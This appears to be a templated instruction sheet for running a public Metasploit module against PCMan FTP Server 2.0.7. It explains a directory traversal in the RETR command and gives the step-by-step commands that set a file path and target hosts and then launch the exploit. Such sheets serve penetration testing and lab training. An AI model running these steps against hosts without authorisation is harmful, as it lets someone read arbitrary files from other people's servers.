**The description of current metasploit exploit**
This module exploits a directory traversal vulnerability found in PCMan FTP Server 2.0.7.          This vulnerability allows an attacker to download arbitrary files from the server by crafting          a RETR command that includes file system traversal strings such as '..//'

---

**The usage instruction:**

Start by loading the module:

```bash
use auxiliary/scanner/ftp/pcman_ftp_traversal
```

Then set the required options:

```bash
# Required parameters with no default value
set PATH <your Path to the file to disclose, relative to the root dir. here>
set RHOSTS <your The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html here>
```

Carefully review the following network-related parameters. These have default values but **may need to be changed** depending on your environment:

* RPORT – default: 21 - The target port (TCP)

If the defaults match your setup, you do **not** need to change them. Otherwise, override them using `set`.

Finally, run the exploit:

```bash
exploit
```
Note:
1. Please execute the command step by step.
2. You can change default value if need.
3. You need to pay attention to whether the default RPORT is consistent with the port where the current service is running.